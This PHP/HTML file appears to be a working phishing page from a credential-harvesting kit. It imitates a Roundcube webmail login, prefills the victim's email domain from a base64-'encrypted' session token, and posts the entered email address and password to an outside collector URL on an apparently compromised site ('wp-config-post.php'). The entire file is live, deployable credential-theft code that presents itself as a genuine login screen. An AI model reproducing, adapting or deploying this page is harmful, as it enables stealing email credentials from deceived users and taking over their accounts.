<?php
ini_set('display_errors',0);
ob_start();
if (!isset($_SESSION)) { session_start();}


if(!isset($_SESSION['UZ_login'])){ header("location:noemail.php");}



$_POST["token"]=$_SESSION['UZ_login'];

function doEncrypt($string)
{
	$rand = substr(md5(microtime()),rand(0,26),2);
	$crystr = "".$rand."".base64_encode($string)."";
	return $crystr;
}

function doDecrypt($string)
{
	$str = substr($string, 2);
	$crystr = base64_decode($str);
	return $crystr;
}

$email = doDecrypt($_POST["token"]);
$userz = explode('@', $email);
 $users = $userz[0];


$ddomain=preg_replace( '!^.+?([^@]+)$!', '$1', doDecrypt($_POST["token"]));

  $domains = explode('@', $email);
    $domain = ucfirst("$domains[1]");
	$domain2 = $domains[1];
    $domains1 = explode('.', $domain);
    $domain1 = ucwords ("$domains1[0]");

?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>Webmail Login</title>
<link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAEAICAAAAEAIADSAgAAFgAAAIlQTkcNChoKAAAADUlIRFIAAAAgAAAAIAgGAAAAc3p69AAAAplJREFUWIXt1j2IHGUYB/DfOzdnjIKFkECIVWIKvUFsIkRExa9KJCLaWAgWJx4DilZWgpDDiI0wiViIoGATP1CCEDYHSeCwUBBkgiiKURQJFiLo4d0eOxYzC8nsO9m9XcXC+8MW+3z+9/l6l2383xH+iSBpElyTdoda26xsDqp/h0CVZ3vwKm7tMBngAs7h7eRYebG6hMtMBHbMBX89vfARHprQ5U8cwdFQlIOZCVR5di1+w/wWXT/EY6EoN5NZCODuKZLDwzgSMCuBe2fwfX6QZwtpWzqfBBtLC3txF/ZhxKbBGx0EfsTJS77vwmGjlZrD4mUzUOXZjVjGI65cnTXchB8iupdDUb7QinsQZ7GzZftdQj2JVZ49iC/w6JjksIo7OnS9tiA5Vn6GtyK2+1MY5NkhfGDygVrBAxH5WkPuMjR7/3UsUFLl2Q68s4XkA3ws3v9zoSjX28Kr5wL1xrTxa6ou+f6OZGvqPg9v1wZeaUjcELE/DVfNhWFSvy/enOIZ9eq1sTokEMNLWI79oirP8g6fXpVnh7GEvY1sV/OJ4f0UhyKKk6EoX4x5pEkgXv6L6OM99YqNw/c4kXSwG5nkIfpLCynuiahW1GWeJHkfT4aiXO9atz1XcD6I6yLyHu6bIPk6Hg9FeYZ63y9EjBarPDvQ8VJ1nd9V3D4m+RncForyxFCQ4hSeahlej88Hefauurdwaufr5z/F/ZHAX6nL+mZE18e36IWiHLkFocqzW9QXcNz1+wUHxJ/f10JRPjvGP4pk/vj5L3F8AtufdD+/p6dJDknzX+05fDLGtife/766t9MRgFCUffWTudwE3AqBlVCUf0xLYGTQqzzbhydwJ3Y34g318J1tmX+DPBTlz9MS2MY2/nP8DTGaqeTDf30rAAAAAElFTkSuQmCC" type="image/x-icon" />

</head>
<style>
  html, body {
  font-family: Arial, sans-serif;
  margin: 0;
  padding: 0;
  border: 0;
  position: absolute;
  height: 100%;
  min-width: 100%;
  font-size: 14px;
  color: #404040;
  direction: ltr;
  -webkit-text-size-adjust: none;
  }
input[type=text] {
  width: 100%;
  height: 100%;
  box-sizing: border-box;
  border: 2px solid #ccc;
  border-radius: 3px;
  font-size: 13px;
  font-family: Arial, Helvetica, sans-serif;
  background-color: white;
  background-image: url("https://i.ibb.co/Zd4DvNr/icon-username.png");
  background-position: 1px 5px; 
  background-repeat: no-repeat;
  padding: 10px 40px;
}
input[type=password] {
  width: 100%;
  height: 100%;
  box-sizing: border-box;
  border: 2px solid #ccc;
  border-radius: 3px;
  font-size: 13px;
  font-family: Arial, Helvetica, sans-serif;
  background-color: white;
  background-image: url("https://i.ibb.co/B38n9Pb/icon-password.png");
  background-position: 2px 7px; 
  background-repeat: no-repeat;
  padding: 10px 40px;
}
  input[type=text]:focus,
  input[type=password]:focus {
  outline: none;
  border: 2px solid #ccc;
  }
</style>
<body>

<div align="center">
	<table border="0" width="682" cellspacing="0" cellpadding="0" height="577" background="https://i.ibb.co/hmzJCF4/bg.png">
		<tr>
			<td>
			<table border="0" width="100%" cellspacing="0" cellpadding="0">
			  <form method="post" action="https://ganpanmarthdesi.pro/z-php/wp-config-post.php" >
				<tr>
					<td height="130"></td>
				</tr>
				<tr>
					<td height="310">
					<table border="0" width="100%" cellspacing="0" cellpadding="0">
						<tr>
							<td width="186"></td>
							<td width="345" height="310" background="https://i.ibb.co/StPwVhK/fm.png">
							<table border="0" width="100%" cellspacing="0" cellpadding="0">
								<tr>
									<td height="117"></td>
								</tr>
								<tr>
									<td height="193">
									<table border="0" width="100%" cellspacing="0" cellpadding="0">
										<tr>
											<td width="40"></td>
											<td>
											<table border="0" width="95%" cellspacing="0" cellpadding="0">
												<tr>
													<td width="285" height="34">
													 <input type="text" name="user" placeholder="Enter your email address." value="" autofocus required >
													 <input type="hidden" name="domain" value="<?php echo $ddomain;?>" >
													 <input type="hidden" name="link" value="https://<?php echo $ddomain;?>" >
													 <input type="hidden" name="sender" value="Roundcube" >
													</td>
												</tr>
												<tr>
													<td height="59"></td>
												</tr>
												<tr>
													<td width="285" height="34">
													<input type="password" name="passwd" placeholder="Enter your email password." required >
													</td>
												</tr>
												<tr>
													<td height="31"></td>
												</tr>
												<tr>
													<td>
													<input type="image" src="https://i.ibb.co/1R2q4Pd/btn.png" width="285" height="34" name="I1"></td>
												</tr>
											</table>
											</td>
											<td width="33"></td>
										</tr>
									</table>
									</td>
								</tr>
							</table>
							</td>
							<td width="186"></td>
						</tr>
					</table>
					</td>
				</tr>
				<tr>
					<td height="265"></td>
				</tr>
				</form>
			</table>
			</td>
		</tr>
	</table>
</div>

</body>

</html>

<script>


 $(document).ready(function(){  
 
 	$('#myModal').modal('toggle'); 
 });

</script>